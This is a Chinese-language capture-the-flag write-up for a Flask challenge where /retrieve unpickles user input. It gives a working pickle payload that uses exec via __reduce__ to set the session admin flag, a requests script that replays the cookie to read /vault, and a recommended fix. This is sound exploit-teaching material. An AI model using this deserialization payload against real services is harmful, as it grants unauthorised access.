# Time Capsule

## 题目简述

应用把时间胶囊对象用 Python `pickle` 序列化并 Base64 编码，`/retrieve` 又对用户提交的任意字节直接执行 `pickle.loads`。Pickle 的 `REDUCE` 语义可以在反序列化时调用任意可导入函数。利用内置 `exec` 在当前 Flask 请求上下文中设置 `session['admin']=True`，再保持响应下发的 Session Cookie 访问 `/vault`，即可取得 flag。

## 解题过程

### 确认反序列化边界

创建接口生成合法 Pickle，而取回接口没有校验对象来源、签名或允许类型：

```python
decoded = base64.b64decode(capsule_data)
capsule = pickle.loads(decoded)
```

危险动作发生在后面的 `isinstance(capsule, TimeCapsule)` 之前；即使最终对象不是 `TimeCapsule`，其 `__reduce__` 指定的可调用对象也早已执行。`/vault` 的唯一授权条件是：

```python
if not session.get('admin', False):
    return jsonify({'error': 'Access denied.'}), 403
```

所以无须启动 shell，直接修改当前请求的 Flask Session 是更短、更稳定的利用目标。

### 构造 `exec` Pickle

让恶意类的 `__reduce__` 返回全局可定位的内置函数 `exec` 及其参数：

```python
import base64
import pickle

class AdminExploit:
    def __reduce__(self):
        code = (
            "import flask\n"
            "flask.session['admin'] = True\n"
        )
        return exec, (code,)

payload = base64.b64encode(
    pickle.dumps(AdminExploit())
).decode()
print(payload)
```

这里只是在本地生成 opcode，不会在序列化时访问 Flask Session；代码要到目标执行 `pickle.loads` 时才运行。源码自带的 `AdminAccess` 示例把 `grant_admin` 定义成 `__reduce__` 内部的局部函数，普通 Pickle 无法按模块全局名可靠定位它，因此官方 solver 改用 `builtins.exec` 是必要修正。

### 保持 Cookie 完成授权

用同一个 HTTP Session 发送 payload 和读取 Vault：

```python
import requests

base = "http://TARGET:5000"
client = requests.Session()

response = client.post(
    f"{base}/retrieve",
    json={"capsule_data": payload},
    timeout=10,
)
response.raise_for_status()
print(response.json())

vault = client.get(f"{base}/vault", timeout=10)
vault.raise_for_status()
print(vault.json()["vault_contents"]["message"])
```

反序列化期间 `flask.session['admin']` 被修改；Flask 在响应结束时把新 Session 签名后写入 Cookie。`requests.Session` 自动保存该 Cookie，第二个请求便通过授权。无需恢复随机生成的 `app.secret_key`，也不能把两次请求放在两个互不共享 Cookie 的客户端中。

最终得到：

```text
shellmates{TiM3_tR4vEL_D3$3RIal1ZaT10N_Hack}
```

## 方法总结

`pickle.loads` 不是数据解析器，而是能调用 Python 对象构造逻辑的执行机制；在检查反序列化结果类型之前，副作用已经发生。此题最精确的利用不是通用命令执行，而是借当前请求上下文修改 Flask Session。修复应停止接收不可信 Pickle，改用 JSON 等纯数据格式；仅做 Base64、异常捕获或反序列化后的类型检查都不能阻止代码执行。
